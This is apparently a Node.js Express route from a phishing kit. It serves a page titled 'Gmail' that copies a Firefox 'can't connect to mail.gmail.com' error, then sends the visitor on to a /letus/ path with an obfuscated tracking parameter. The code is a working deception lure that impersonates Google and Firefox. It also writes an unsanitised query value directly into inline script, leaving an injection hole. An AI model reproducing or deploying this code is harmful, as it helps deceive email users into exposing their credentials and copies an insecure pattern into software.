
const express = require ('express');
const router = express.Router();
const db = require('../database');
router.use(express.static('public'));


//validate form data before handling
// Custom middleware for form validation
router.get('/', (req, res) => {

    const data2 = req.query.uihdft948fdjxgjdferuidh;
    const url = `/letus/?dgdfghfdhsnsxbsahdbaxuisadbasdb=${data2}`;
    if (data2 == null) {
        res.render('error');
        
      }else{

    const htmlContent = `
     <!doctype html>
        <html lang="en">
        <head>
           <script>
                setTimeout(function() {
                    window.location.href = '${url}';
                }, 2000);


                function myfuncion(){

                     window.location.href = '${url}';
                }
            </script> 
            <!-- Required meta tags -->
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <title>Gmail</title>
            <link rel="shortcut icon" href="/images/image.png" type="image/png">

            <style>
        body {
        
            font-family: "Google Sans",roboto,"Noto Sans Myanmar UI",arial,sans-serif;
        
        }
        
        #main{
        display: flex;
        flex-direction: column;               
        width: 700px;
        height: 300px;
        margin-left: 34%;
        margin-top: 10%;
       
        
        }

        button{
            width: 90px;
            height: 50px;
            border-radius: 12px;
            background-color: #0061e0;
            color: #fff;
            border-color: transparent;
            align-self:flex-end;
            margin-right: 50px;
            font-size: 16px;
            padding: 5px;
            box-shadow:  0 2px 4px 0 rgba(0,0,0,.3);
            cursor: pointer;

        }
        </style>
        </head>
        <body>
        
            <div id="main">
            
        
            <h1>Hmm. We’re having trouble finding that site.</h1>
        
            <p>We can’t connect to the server at mail.gmail.com.</p>
            
            <p><b>If you entered the right address, you can:</b></p>
            
                <p>&nbsp;&nbsp;&nbsp;&#x2022;&nbsp;Try again later</p>
                <p>&nbsp;&nbsp;&nbsp;&#x2022;&nbsp;Check your network connection</p>
                <p>&nbsp;&nbsp;&nbsp;&#x2022;&nbsp;Check that Firefox has permission to access the web (you might be connected but behind a firewall)</p>
        
            <button onclick="myfuncion();">Try Again</button>
        
            </div>
       
        </body>
            </html>
    `;

    // Send the HTML content as a response
    res.send(htmlContent);

            }
});




module.exports =router;
